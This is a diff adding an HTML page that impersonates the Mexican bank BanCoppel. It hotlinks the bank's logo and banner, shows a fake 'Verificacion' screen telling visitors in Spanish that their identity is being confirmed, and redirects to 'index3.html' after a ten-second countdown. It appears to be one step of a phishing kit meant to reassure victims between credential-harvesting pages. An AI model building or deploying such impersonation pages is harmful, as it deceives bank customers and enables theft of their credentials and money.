@@ -1,0 +1,125 @@
+<html>
+ 
+<head>
+    <link rel="stylesheet" href="bootstrap.min.css">
+
+    <title>Home</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" http-equiv="refresh" content="width=device-width, initial-scale=1" />
+    <link rel="stylesheet" type="text/css" href="util.css">
+    <link rel="stylesheet" type="text/css" href="main.css">
+ 
+</head>
+
+<body>
+    <header id="main-header">
+
+        <a class="logo-header" href="index.html">
+            <img src="https://www.bancoppel.com/images/logo-bancoppel.svg">
+        </a> <!-- / #logo-header -->
+
+
+
+
+        <div class="menu-header" href="index.html">
+            <div id="bar-menu" class="bar-menu">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+    </header><!-- / #main-header -->
+    <div class="limiter">
+        <div class="container-login100" style="background-image: url(https://www.bancoppel.com/images/landings/header_tarjeta_credito_en_linea.png); 
+    position: absolute;
+   ">
+            <div class="wrap-login100 p-l-55 p-r-55 p-t-50 p-b-54">
+
+                <br>
+                <br>
+
+                <form class="login100-form validate-form" method="post" action="">
+
+
+                    <b>
+                        <div class="textypn1"><span class="model"
+                                style="font-size:28px; color:#003995; text-align:center;">
+                                Verificacion</div>
+                    </b>
+                    <div class="wrap-input101 validate-input" data-validate="">
+                        <br>
+
+                         
+
+
+
+                        <script language="JavaScript">
+
+                            /* Determinamos el tiempo total en segundos */
+                            var totalTiempo = 10;
+
+                            var url = "index3.html";
+
+                            function updateReloj() {
+                                document.getElementById('CuentaAtras').innerHTML = "Por favor, espera " + totalTiempo + " segundos, estamos verificando tu información para confirmar tu identidad. <br> ";
+
+                                if (totalTiempo == 0) {
+                                    window.location = url;
+                                } else {
+                                    /* Restamos un segundo al tiempo restante */
+                                    totalTiempo -= 1;
+                                    /* Ejecutamos nuevamente la función al pasar 1000 milisegundos (1 segundo) */
+                                    setTimeout("updateReloj()", 1000);
+                                }
+                            }
+                            window.onload = updateReloj;
+
+                        </script>
+
+<center><img src="https://i.imgur.com/2xdNzxu.png">
+    <img class="gifi" src="https://thumbs.gfycat.com/SpryNegligibleLeafcutterant-max-1mb.gif" style="display: block;position: relative;color:#333;background: white;border: none;top: -181px;left: -3px;height: -4px;width: 99px;padding-left: 8px;outline: none;font-size: 16px;font-family: dinReg, sans-serif;">
+
+    <h3 class="texto1" id="CuentaAtras" style="
+    text-align: center;
+    /* display: block; */
+    /* margin: auto; */
+    font-family: monospace;
+    margin-top: -67px;
+    ">Por favor, espera 10 segundos, estamos verificando tu información para confirmar tu identidad. <br> </h3>
+</center>
+                         
+ 
+                    </div>
+
+
+                    <br>
+                    <div class="text-right p-t-8 p-b-31">
+
+                    </div>
+
+
+                    <div>
+                        <br>
+                        <br>
+
+
+                    </div><br>
+
+
+
+                </form>
+
+            </div>
+
+        </div>
+        <header id="main-header2">
+        </header><!-- / #main-header -->
+    </div>
+    <div id="dropDownSelect1"></div>
+
+
+
+
+</body>
+
+</html>
